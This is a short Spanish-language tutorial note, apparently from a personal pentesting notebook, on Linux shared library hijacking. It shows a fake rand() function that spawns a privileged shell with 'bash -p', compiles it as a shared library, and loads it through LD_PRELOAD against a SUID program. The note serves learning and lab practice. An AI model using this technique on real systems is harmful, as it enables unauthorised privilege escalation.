Es un concepto similar al [[Python Library Hijacking]], ya que este ataque se basa en hacer que un programa cargue tu biblioteca `.so` falsa en lugar de la original.
Cuando un programa corre, el _dynamic loader_ (`ld-linux.so`) busca las librerías siguiendo un orden de búsqueda (LD_PRELOAD, RPATH, RUNPATH, /usr/lib, etc.). Si vos podés poner una `.so` con **el mismo nombre** en un lugar que el loader mira antes, la tuya se carga.

---
Con el siguiente comando, podemos listar los modulos que carga un archivo **C** (entre otros),

```bash
uftrace --force -a archivo
```
---
Supongamos que tenemos un archivo con _SUID_ que llama a la libreria **rand**, podemos hacer un secuestro de la libreria.

1) Creamos un archivo test.**c**, por ejemplo, y **EN EL CONTENIDO**, tiene que haber una funcion llamada _rand_, que va a ser lo que se secuestra:

```c
int rand(void){
	system("bash -p");
	return 0;
}
```
**NOTA**: Cabe aclarar que para cada funcion es distinta la arquitectura, no siempre va a ser lo mismo, a eso lo vemos en el manual --> _man 3 rand_ -> 3 para aclarar que son las librerias de **C** 
2) Luego compilamos ese archivo y, una vez compilado, obtenemos la libreria llamada _test_:
```bash
gcc -shared -fPIC test.c -o test
```

3) Ahora, con el comando **LD_PRELOAD**, podemos hacer que el programa utilice mi libreria _test_ y va a tener una mayor jerarquia que la libreria por defecto de _rand_:
```bash
LD_PRELOAD=./test ./random
```

---
---
---


